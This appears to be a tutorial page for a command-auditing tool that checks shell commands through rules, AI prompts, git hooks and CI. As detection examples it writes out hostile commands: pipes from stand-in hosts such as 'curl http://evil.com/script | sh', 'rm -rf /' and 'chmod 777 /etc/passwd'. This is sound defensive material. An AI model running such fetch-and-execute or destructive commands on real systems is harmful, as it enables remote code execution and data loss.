---
layout: default
title: Getting Started Tutorial
nav_order: 6
description: "Step-by-step tutorial for setting up and using AI Command Auditor"
---

# 🎓 Getting Started Tutorial

Welcome to the AI Command Auditor tutorial! This comprehensive guide will walk you through installing, configuring, and using AI Command Auditor to secure your development workflow. By the end of this tutorial, you'll have a fully configured setup that validates commands and protects your projects.

## 📚 What You'll Learn

- Installing AI Command Auditor in different environments
- Setting up your first project with security validation
- Configuring rules and AI prompts for your needs
- Integrating with git hooks for automatic validation
- Using the CLI and Python API effectively
- Best practices for team collaboration

## 🎯 Prerequisites

Before starting, make sure you have:

- Python 3.8 or higher
- Git installed and configured
- Basic familiarity with command line
- (Optional) OpenAI or Anthropic API key for enhanced AI analysis

## 📦 Step 1: Installation

Let's start by installing AI Command Auditor. Choose the method that best fits your workflow:

### Quick Installation (Recommended)

The fastest way to get started is with our one-line installer:

```bash
curl -fsSL https://raw.githubusercontent.com/etherisc/ai-command-auditor/main/install.sh | sh
```

This installer will:

- Download and install the latest version
- Set up the configuration directory
- Configure shell integration
- Install default templates and rules

### Alternative: Python Package Installation

If you prefer to install via pip:

```bash
# Install the package
pip install ai-command-auditor

# Initialize configuration
ai-auditor install --local
```

### Verify Installation

Check that everything is working:

```bash
# Check version
ai-auditor --version

# Test basic functionality
ai-auditor check-command "echo 'Hello, World!'"
```

**Expected Output:**

```
AI Command Auditor v1.0.0

Command Analysis: echo 'Hello, World!'
===================================

✅ RISK LEVEL: LOW
🔢 SAFETY SCORE: 95/100

✅ No security issues found
📝 This command appears safe to execute
```

## 🏗️ Step 2: First Project Setup

Now let's set up AI Command Auditor for your first project:

### Create a Sample Project

```bash
# Create and enter project directory
mkdir my-secure-project
cd my-secure-project

# Initialize git repository
git init

# Create some sample files
echo "# My Secure Project" > README.md
echo "print('Hello from Python!')" > hello.py
echo "#!/bin/bash\necho 'Hello from Bash!'" > hello.sh
chmod +x hello.sh
```

### Initialize AI Command Auditor

```bash
# Initialize for this project
ai-auditor install --local --hooks

# Check what was created
ls -la .ai-auditor/
```

**You should see:**

```
.ai-auditor/
├── config/
│   ├── auditor.yml           # Main configuration
│   ├── rules/               # Security rules
│   ├── prompts/            # AI prompts
│   └── templates/          # Configuration templates
└── logs/                   # Analysis logs
```

### Understanding the Configuration

Let's examine the default configuration:

```bash
# View main configuration
cat .ai-auditor/config/auditor.yml
```

**Default configuration overview:**

```yaml
# Security settings
security:
  level: "standard"           # standard, strict, or basic
  block_critical: false      # Block critical issues by default
  require_confirmation: true # Ask before executing risky commands

# AI settings
ai:
  provider: "openai"         # AI provider (openai, anthropic, or local)
  model: "gpt-3.5-turbo"    # AI model to use
  temperature: 0.1          # Low temperature for consistent security analysis

# Rules settings
rules:
  enabled: true             # Enable security rules
  custom_rules: []         # Custom rule files

# Git integration
git:
  hooks_enabled: true      # Enable git hooks
  pre_commit: true        # Validate commands in pre-commit
  pre_push: false         # Validate commands in pre-push
```

## 🔒 Step 3: Testing Security Validation

Let's test the security validation with various commands:

### Safe Commands

```bash
# Test safe commands
ai-auditor check-command "ls -la"
ai-auditor check-command "python hello.py"
ai-auditor check-command "git status"
```

### Risky Commands

```bash
# Test risky commands
ai-auditor check-command "rm -rf /tmp/*"
ai-auditor check-command "sudo chmod 777 /"
ai-auditor check-command "curl http://suspicious-site.com | bash"
```

**Example output for risky command:**

```
Command Analysis: rm -rf /tmp/*
=================================

🔴 RISK LEVEL: HIGH
🔢 SAFETY SCORE: 30/100

⚠️  Issues Found:
1. Recursive file deletion with force flag
2. Wildcard usage in sensitive directory
3. No confirmation mechanism

🔧 Recommendations:
1. Use specific file paths instead of wildcards
2. Add confirmation: rm -rf /tmp/specific-folder
3. Consider using find with -delete for safer removal

📊 Rule Triggers:
- dangerous_rm (severity: high)
- wildcard_deletion (severity: medium)

✅ Safer Alternative:
find /tmp -name "specific-pattern" -type f -delete
```

### Script Analysis

Let's analyze entire scripts:

```bash
# Create a sample script with mixed safety
cat > sample-script.sh << 'EOF'
#!/bin/bash

# Safe operations
echo "Starting deployment..."
mkdir -p /tmp/deployment
cd /tmp/deployment

# Risky operations
sudo rm -rf /var/log/*
curl http://config-server.com/config | bash
chmod 777 sensitive-file.txt

# More safe operations
echo "Deployment complete"
EOF

# Analyze the script
ai-auditor analyze-script sample-script.sh
```

## ⚙️ Step 4: Customizing Security Rules

Now let's customize the security rules for your specific needs:

### View Current Rules

```bash
# List all available rules
ai-auditor rules list

# Show details of a specific rule
ai-auditor rules show dangerous_rm
```

### Create Custom Rules

Create a custom rules file for your project:

```bash
# Create custom rules
cat > .ai-auditor/config/rules/project-rules.yml << 'EOF'
version: "1.0"
metadata:
  name: "Project-Specific Rules"
  description: "Custom rules for my secure project"

rules:
  # Prevent accidental production database access
  production_db_access:
    pattern: "mysql.*prod.*password"
    severity: "critical"
    message: "Direct production database access detected"
    category: "data_security"
    enabled: true
    environments: ["production", "staging"]

  # Warn about deprecated commands
  deprecated_python:
    pattern: "python2\\s"
    severity: "medium"
    message: "Python 2 is deprecated, use Python 3"
    category: "deprecation"
    enabled: true

  # Check for hardcoded secrets
  potential_secrets:
    pattern: "(password|token|key)\\s*=\\s*['\"][^'\"]{8,}['\"]"
    severity: "high"
    message: "Potential hardcoded secret detected"
    category: "secrets"
    enabled: true
EOF

# Load the custom rules
ai-auditor config set rules.custom_rules '["project-rules.yml"]'

# Test custom rule
ai-auditor check-command "mysql -h prod.db.company.com -p password123"
```

### Disable Unwanted Rules

```bash
# Disable rules that are too strict for your workflow
ai-auditor rules disable sudo_usage

# Re-enable later if needed
ai-auditor rules enable sudo_usage
```

## 🤖 Step 5: Configuring AI Analysis

Let's set up AI-powered analysis for more intelligent validation:

### Configure AI Provider

If you have an API key, configure your AI provider:

```bash
# Set up OpenAI (recommended)
export OPENAI_API_KEY="your-api-key-here"
ai-auditor config set ai.provider "openai"
ai-auditor config set ai.model "gpt-4"

# Or use Anthropic Claude
export ANTHROPIC_API_KEY="your-api-key-here"
ai-auditor config set ai.provider "anthropic"
ai-auditor config set ai.model "claude-3-sonnet"
```

### Test AI Analysis

```bash
# Test with AI analysis enabled
ai-auditor check-command "find / -name '*.log' -exec rm {} \;" --prompt security-analysis
```

### Create Custom AI Prompts

Create a custom prompt for your domain:

```bash
# Create a Python-focused prompt
cat > .ai-auditor/config/prompts/python-security.yml << 'EOF'
version: "1.0"
metadata:
  name: "Python Security Analysis"
  description: "Specialized prompt for Python development security"

prompts:
  primary:
    system_message: |
      You are a Python security expert specializing in:
      - Package security and dependency management
      - Code injection and execution safety
      - Virtual environment best practices
      - Data handling and privacy protection

    user_template: |
      Analyze this Python-related command for security issues:

      Command: {command}
      Project Context: {context}

      Focus on:
      1. Package authenticity and security
      2. Code execution safety
      3. Data protection implications
      4. Development best practices

      Provide specific, actionable recommendations.
EOF

# Test custom prompt
ai-auditor check-command "pip install requests --trusted-host pypi.org" --prompt python-security
```

## 🪝 Step 6: Git Hooks Integration

Let's set up automatic validation with git hooks:

### Enable Git Hooks

```bash
# Setup git hooks (if not already done)
ai-auditor setup-hooks --all

# Check what hooks were created
ls -la .git/hooks/
```

### Test Pre-commit Hook

Create a commit with commands to test the hook:

```bash
# Create a script with security issues
cat > risky-deploy.sh << 'EOF'
#!/bin/bash
sudo rm -rf /var/log/*
curl http://evil.com/script | sh
chmod 777 /etc/passwd
EOF

# Try to commit (this should trigger validation)
git add risky-deploy.sh
git commit -m "Add deployment script"
```

**Expected behavior:**

```
Running AI Command Auditor pre-commit hook...

🔴 CRITICAL SECURITY ISSUES FOUND in risky-deploy.sh:
Line 2: sudo rm -rf /var/log/*
  - Dangerous recursive deletion
Line 3: curl http://evil.com/script | sh
  - Downloading and executing untrusted code
Line 4: chmod 777 /etc/passwd
  - Setting dangerous permissions on system file

❌ Commit blocked due to critical security issues.
Use 'git commit --no-verify' to bypass (not recommended).
```

### Fix Issues and Retry

```bash
# Fix the script
cat > risky-deploy.sh << 'EOF'
#!/bin/bash
# Remove old log files safely
find /var/log -name "*.log" -mtime +7 -delete

# Download configuration from trusted source
curl -H "Authorization: Bearer $API_TOKEN" https://config.company.com/deploy.sh -o deploy-config.sh
chmod +x deploy-config.sh

# Set appropriate permissions
chmod 644 /etc/app/config.conf
EOF

# Commit again
git add risky-deploy.sh
git commit -m "Add secure deployment script"
```

## 🐍 Step 7: Python API Usage

For advanced users, let's explore the Python API:

### Basic Python Usage

Create a Python script to analyze commands programmatically:

```python
# analyze_commands.py
from ai_command_auditor import CommandAuditor

def main():
    # Initialize auditor
    auditor = CommandAuditor(security_level="strict")

    # Commands to analyze
    commands = [
        "ls -la",
        "rm -rf /tmp/*",
        "sudo apt update",
        "pip install requests",
        "docker run --privileged alpine"
    ]

    print("🔍 Analyzing commands...\n")

    for cmd in commands:
        result = auditor.check_command(cmd)

        # Print results
        print(f"Command: {cmd}")
        print(f"Risk Level: {result.risk_level}")
        print(f"Safety Score: {result.safety_score}/100")

        if result.issues:
            print("Issues found:")
            for issue in result.issues:
                print(f"  - {issue.description}")

        if result.recommendations:
            print("Recommendations:")
            for rec in result.recommendations:
                print(f"  - {rec}")

        print("-" * 50)

if __name__ == "__main__":
    main()
```

Run the analysis:

```bash
python analyze_commands.py
```

### Batch Analysis with Context

```python
# batch_analysis.py
from ai_command_auditor import CommandAuditor

def analyze_deployment_script():
    auditor = CommandAuditor()

    # Analyze with context
    result = auditor.analyze_script(
        "risky-deploy.sh",
        context={
            "environment": "production",
            "project_type": "web_app",
            "criticality": "high"
        }
    )

    print(f"📁 Script Analysis: {result.script_path}")
    print(f"Overall Score: {result.overall_score}/100")
    print(f"Critical Issues: {result.critical_count}")
    print(f"Total Issues: {len(result.issues)}")

    # Show issues by line
    for line_result in result.line_results:
        if line_result.issues:
            print(f"\nLine {line_result.line_number}: {line_result.command}")
            for issue in line_result.issues:
                print(f"  ⚠️  {issue.description}")

if __name__ == "__main__":
    analyze_deployment_script()
```

## 🏢 Step 8: Team Configuration

Set up AI Command Auditor for team collaboration:

### Create Team Configuration Template

```bash
# Create team configuration
cat > .ai-auditor/config/team-config.yml << 'EOF'
# Team configuration for MyCompany
version: "1.0"
metadata:
  organization: "MyCompany"
  team: "DevOps"
  environment: "production"

# Strict security for production
security:
  level: "strict"
  block_critical: true
  require_approval: true
  audit_log: true

# Conservative AI settings
ai:
  provider: "openai"
  model: "gpt-4"
  temperature: 0.1

# Team-specific rules
rules:
  enabled: true
  custom_rules:
    - "team-rules.yml"
    - "compliance-rules.yml"

# Compliance requirements
compliance:
  standards: ["SOX", "GDPR", "HIPAA"]
  audit_trail: true
  approval_required: ["production"]

# Notification settings
notifications:
  slack_webhook: "${SLACK_WEBHOOK_URL}"
  email_alerts: ["security@company.com"]
  critical_issues: true
EOF

# Apply team configuration
ai-auditor config import .ai-auditor/config/team-config.yml
```

### Version Control Best Practices

```bash
# Add configuration to git (excluding sensitive files)
echo "# AI Command Auditor" >> .gitignore
echo ".ai-auditor/logs/" >> .gitignore
echo ".ai-auditor/cache/" >> .gitignore

# Add configuration files
git add .ai-auditor/config/
git add .gitignore
git commit -m "Add AI Command Auditor team configuration"
```

## 📊 Step 9: Monitoring and Reporting

Set up monitoring and reporting for your security analysis:

### Generate Security Reports

```bash
# Generate various reports
ai-auditor report security-analysis --period 7d --format html --output security-report.html
ai-auditor report rules-usage --format json --output rules-stats.json
ai-auditor report compliance --include violations,recommendations
```

### Set up Automated Auditing

Create a script for regular security audits:

```bash
# Create audit script
cat > .ai-auditor/scripts/daily-audit.sh << 'EOF'
#!/bin/bash

# Daily security audit script
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_DIR=".ai-auditor/reports"

mkdir -p "$REPORT_DIR"

echo "🔍 Running daily security audit..."

# Audit all scripts in project
ai-auditor audit --all --format json > "$REPORT_DIR/audit_$TIMESTAMP.json"

# Generate human-readable report
ai-auditor report security-analysis --period 1d --format html > "$REPORT_DIR/daily_report_$TIMESTAMP.html"

# Check for critical issues
CRITICAL_COUNT=$(ai-auditor audit --all --format json | jq '.critical_issues | length')

if [ "$CRITICAL_COUNT" -gt 0 ]; then
    echo "🚨 WARNING: $CRITICAL_COUNT critical security issues found!"
    echo "Review the report: $REPORT_DIR/daily_report_$TIMESTAMP.html"
    exit 1
else
    echo "✅ No critical security issues found"
fi
EOF

chmod +x .ai-auditor/scripts/daily-audit.sh

# Test the audit script
./.ai-auditor/scripts/daily-audit.sh
```

## 🚀 Step 10: Advanced Usage

Now let's explore some advanced features:

### Custom Analysis Pipeline

```python
# advanced_analysis.py
from ai_command_auditor import CommandAuditor, RuleEngine, PromptManager

class ProjectAuditor:
    def __init__(self):
        self.auditor = CommandAuditor()
        self.rule_engine = RuleEngine()
        self.prompt_mgr = PromptManager()

    def analyze_with_context(self, command, project_type):
        # Select appropriate prompt based on project type
        prompt_map = {
            "python": "python-security",
            "nodejs": "web-development",
            "devops": "infrastructure-security"
        }

        prompt = prompt_map.get(project_type, "general-analysis")

        # Run analysis with context
        result = self.auditor.check_command(
            command,
            context={"project_type": project_type},
            prompt_name=prompt
        )

        return result

# Usage
auditor = ProjectAuditor()
result = auditor.analyze_with_context("pip install package", "python")
print(f"Analysis result: {result.risk_level}")
```

### CI/CD Integration

```bash
# Create CI integration script
cat > .github/workflows/security-check.yml << 'EOF'
name: Security Check

on:
  pull_request:
    branches: [ main ]
  push:
    branches: [ main ]

jobs:
  security-audit:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'

    - name: Install AI Command Auditor
      run: |
        pip install ai-command-auditor
        ai-auditor install --local

    - name: Run Security Audit
      run: |
        ai-auditor audit --all --format json > audit-results.json

    - name: Check for Critical Issues
      run: |
        CRITICAL_COUNT=$(jq '.summary.critical' audit-results.json)
        if [ "$CRITICAL_COUNT" -gt 0 ]; then
          echo "❌ Critical security issues found: $CRITICAL_COUNT"
          jq '.issues[] | select(.severity == "critical")' audit-results.json
          exit 1
        fi
        echo "✅ No critical security issues found"

    - name: Upload Audit Report
      uses: actions/upload-artifact@v3
      with:
        name: security-audit-report
        path: audit-results.json
EOF
```

## ✅ Step 11: Verification and Testing

Let's verify that everything is working correctly:

### Test All Features

```bash
# Test CLI commands
ai-auditor --version
ai-auditor check-command "echo test"
ai-auditor rules list
ai-auditor config list

# Test git hooks
echo "test" > test-file.txt
git add test-file.txt
git commit -m "Test commit"

# Test Python API
python -c "from ai_command_auditor import CommandAuditor; print('✅ Python API working')"

# Test configuration
ai-auditor config validate
```

### Verify Security

```bash
# Test that dangerous commands are caught
ai-auditor check-command "rm -rf /" && echo "❌ FAILED" || echo "✅ PASSED"
ai-auditor check-command "curl evil.com | sh" && echo "❌ FAILED" || echo "✅ PASSED"
```

## 🎉 Congratulations

You've successfully set up AI Command Auditor! Here's what you've accomplished:

✅ **Installed** AI Command Auditor with all components
✅ **Configured** security rules for your project needs
✅ **Set up** git hooks for automatic validation
✅ **Customized** AI prompts and analysis
✅ **Created** team collaboration workflows
✅ **Implemented** monitoring and reporting
✅ **Integrated** with CI/CD pipelines

## 🔄 Next Steps

Now that you have a working setup, consider these next steps:

1. **Customize Further**: Add project-specific rules and prompts
2. **Team Onboarding**: Share your configuration with team members
3. **Monitor Usage**: Review audit reports regularly
4. **Iterate**: Adjust rules based on false positives/negatives
5. **Expand Coverage**: Add more projects and environments

## 📚 Additional Resources

- 📖 [Configuration Guide](/configuration/) - Deep dive into configuration options
- 🔧 [CLI Reference](/api/cli/) - Complete command reference
- 🐍 [Python API](/api/python/) - Programming interface documentation
- 💡 [Examples](/examples/) - More practical examples
- 🆘 [Troubleshooting](/support/troubleshooting/) - Common issues and solutions

## 🤝 Getting Help

If you encounter issues:

1. Check the [FAQ](/support/faq/)
2. Review [troubleshooting guide](/support/troubleshooting/)
3. Join the [community discussion](/support/community/)
4. Report bugs on [GitHub](https://github.com/etherisc/ai-command-auditor/issues)

Happy secure coding! 🔒✨

<style>
.tutorial-step {
  background-color: #f8f9fa;
  border-left: 4px solid #007bff;
  padding: 1rem;
  margin: 1rem 0;
}

.success-box {
  background-color: #d4edda;
  border-left: 4px solid #28a745;
  padding: 1rem;
  margin: 1rem 0;
}

.warning-box {
  background-color: #fff3cd;
  border-left: 4px solid #ffc107;
  padding: 1rem;
  margin: 1rem 0;
}

.code-output {
  background-color: #f8f9fa;
  border: 1px solid #e9ecef;
  padding: 1rem;
  font-family: monospace;
  white-space: pre-wrap;
}

@media (max-width: 768px) {
  .tutorial-step, .success-box, .warning-box {
    margin: 0.5rem 0;
    padding: 0.75rem;
  }
}
</style>
